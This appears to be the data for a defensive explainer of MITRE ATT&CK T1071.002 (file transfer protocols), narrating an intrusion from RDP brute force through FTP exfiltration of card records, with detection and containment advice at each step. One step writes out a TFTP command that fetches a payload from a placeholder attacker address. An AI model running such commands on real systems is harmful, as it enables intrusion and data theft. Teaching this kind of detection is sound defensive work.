title: T1071.002 — Application Layer Protocol - File Transfer Protocols
subtitle: The story is called "Vans at night".
aria: T1071.002 - Application Layer Protocol - File Transfer Protocols

nodes.label: Sensitive data
nodes.tip: Sensitive data - What is at risk

steps.title: Way in
steps.caption: At 01:58 the attacker brute-forces the exposed RDP service on FIN-FS-02 and signs in with the weak service account svc_finbackup. 412 failed logons end with one success from 198.51.100.9. TCP/3389 reachable from the internet plus a failure burst followed by a success means MFA is missing and the account is exposed
steps.defender: Edge, DNS and network-flow telemetry provide the first reliable evidence.

steps.title: Fetch the toolkit
steps.caption: At 02:04 the attacker runs the built-in TFTP client: tftp -i 198.51.100.140 get tools.exe . Windows Server can still have this client installed. a server speaking TFTP is nearly always wrong. Watch for tftp.exe starting and for UDP/69 egress (traffic that leaves your network)
steps.defender: Edge, DNS and network-flow telemetry provide the first reliable evidence.

steps.caption: The 6.2 MB payload arrives in about four seconds. The attacker drops it in C:\Users\Public and starts it. match the tftp.exe process with a new binary on disk, then check the hash on other hosts

steps.title: Quiet hands-on time
steps.caption: Over RDP the attacker lists payment folders such as Finance\Cards and starts using a new local admin account. odd-hours interactive logons on servers and new local admin use deserve a phone call, not a ticket
steps.defender: Edge, DNS and network-flow telemetry provide the first reliable evidence.

steps.title: Data out the back
steps.caption: At 02:47 the attacker uploads 1.8 GB of card records to ftp-heavyhaul[.]net with one FTP PUT as user cardops. servers rarely speak FTP outbound. Big volume, a first-seen external host, and night time make a strong exfiltration signal
steps.defender: Edge, DNS and network-flow telemetry provide the first reliable evidence.

steps.title: Firewall log alert
steps.caption: The rule "server subnet to external FTP" fires. The analyst opens the Zeek ftp.log session and sees USER cardops and STOR cards_2026_08.csv. command-level logs let you name the stolen file in the first ten minutes of the case
steps.defender: Edge, DNS and network-flow telemetry provide the first reliable evidence.

steps.title: Scope the damage
steps.caption: Hunting finds three FTP sessions to the same destination. FIN-FS-01 tried the same TFTP fetch, but the egress rule blocked it. hunt TFTP and FTP across every server for at least 30 days before you say only one host was hit
steps.defender: Edge, DNS and network-flow telemetry provide the first reliable evidence.

steps.title: Contain and close
steps.caption: The team blocks 198.51.100.140 and 198.51.100.150 plus the domain, isolates FIN-FS-02, rotates the service account, and enables MFA on RDP. fix identity and egress rules, not only the malware. Re-image the host before it returns to service
